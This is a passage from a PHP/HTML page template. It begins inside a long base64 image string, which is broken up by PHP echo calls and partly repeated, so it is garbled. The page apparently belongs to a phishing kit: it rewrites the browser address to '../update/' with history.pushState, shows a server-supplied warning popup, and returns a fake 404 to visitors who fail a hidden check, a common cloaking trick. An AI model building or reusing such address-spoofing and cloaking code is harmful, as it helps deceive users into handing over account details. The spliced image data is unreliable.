hgtgKFPykgBXlRYDZAetvxgBkLINJE0YecWWfaDvdxh5kWLcb0g0BMHAeDCa1ZgWJMGTo4JFlaDBQaYi3kVgOMwcGgQGtQJugZQRCINkFpps2Q3o+5eQcibgWlAJJ6yTkpUAjRwTCEkwJUWeMFCF1QQgcjeGABl2qe4ONsamJw5EwoqInRAhOqlqahMgwKwA98GgpRAEE4th0MJwAh6UBDHKkCU5tiJEQMKaTQgwShgobiDpqm6mpOWyQqihgMIkT66q0bAQECbFRFgOuvOD3gBQeWdkZBC1NsAOyyOj1wwAE4OBQQACH5BAkEAB8ALEkAhwCgAB4AAAj/AD8IHEiwoMGDCBMqXMiwocOHEA3i4IEnQ4IDETNq3Mixo8eFBuwwmAOgJIA5ccg8+ciypcuXEDfIIWmyZsk5FWLA3KnxQQIsaS5g5OkSCk2bSE92KEC0acIvFY6epHBjgFOOMqQmRRrmwdWvGShorTlHzNeIZcZutbkjQMIId8qwebPyLMQ3am3OIWO3YZu8a2vmOIhBLNk5QfoyvANYbx3FCYU0DnxzT0EIeedMcAvZIILJeqF0NmiDsmkADAiSmTxhdEEGp/UScC0wC2jTc6wIXAB6zhvaH+DcRjoG+JvYpo8IhH16jgDaR5DrBV5BeuA5D6QMBxDFtYDteqV4/wdP+YIY6WdcG7Buk4nrDewDe1EiHY1rBPFNmnHdJf9WKGrU5xoe/gEg2mgJFIhUEElIV4Z6BWLgmgQK2pSHdsg54doA5Jk0RxcbdrjWShTE5hxtYOQ3B3AOVHjTbEz0tgZwX4j4IG12uAhABQPVMZlywH1QonVzKAAchhUmQVAOmYXxXJBYgDfHjEHqUSEFTw7kRRxa+RYkQWoMN0cDX36ApIptIHSBG2TUoYQFnJUpkB29ySHnBx6IWJJ9d2YERxzX/dYnByIygEOfGglwg2EezqEBEIgKNJN1DggRKUdCxOCFF2lIcClBY4jZxKGflvoSHmBMRoFZprb6Ugx0ABaq1xFexOnqrSwFYEAaXuSxQAJeKRQQACH5BAUoADcALEkAhwCgAB4AAAj/AG8IHEiwoMGDCBMqXMiwocOHEBEOeBAgosWLGDNq3NjwSQ0KMGAACAlhgQCOKFOqXBmRBEgAMGPGhHHiJMubFh8kwNLjwgGcKzf8ECmz6MwPQJMqtDJUJowVQQYozdiDqNGrI7VM3XojAwOrRmGQ4AqxKtazIz0ojDBFRAcqT8hCpAIWK4wOchlmqYu2KAwMBzGsABsSSt6FU/jaHXE4oZG+fWEQKDhC8UgWFRsXRGDZLg3NBVN0hgwTAsEOowGwAE1QBWm/k1nfcP36LIyfN5ykHklF9oLdVzXIJgIc8hSBtCHDsKm5RW2/srU8R+vgRpXiAJBqFoDdrxTWFabb/w5A4jkI0BLEy2TCunvfLB6evwCNQH1MH6ALuEfLI4R8+vbB9JlmAex3VhcuPCcCaAYECABgoBmIVRZSYBcFaANICAMPrCXn4EhSrfDacqztYB8MsmnwYUwMCMTEbjCYIJsVBi7I2hMSFiWjQJX11YJsAok4HQwKAEnBijBwQRAElsEwQWayzdBdjEDe4EOOMDVgUAovOdVblQKFUBwMQ4A5m4MwbIDQBSV0MIIHFkBp5gkwcmDmDRFoGMSdFy1wpG1f3knCfjCgwCdGAQQxmFM0AXGoQFtMKcOjGgkRQwop9CABpQQ98ady+HEqKksBiIkWDDYIMeqqLAmQAgshzRFUQRBFsmrrTQRksQEQBTAUEAA7/HEqKksBiIkWDDYIMeqqLAmQAgshzRFUQRBFs<?php echo $bero3; ?>TAUEAA7/RBFs<?php echo $bero2; ?>TAUEAA7<?php echo $bero;?>" width="107" height="108"></p>
</div> 
  
</div>
</div>

<div></div></body>
<script>
window.history.pushState('<?php echo $bert;?>', '<?php echo $bert;?>', '../update/');
</script>
<style>
.swal2-popup {font-size: 16;}
</style>
<script>
function geo() {
Swal.fire({
  type: 'warning',
  text: '<?php echo $uned;?>',
})}
</script>
</html>
<?php
}else {
header("HTTP/1.0 404 Not Found");	
}
?>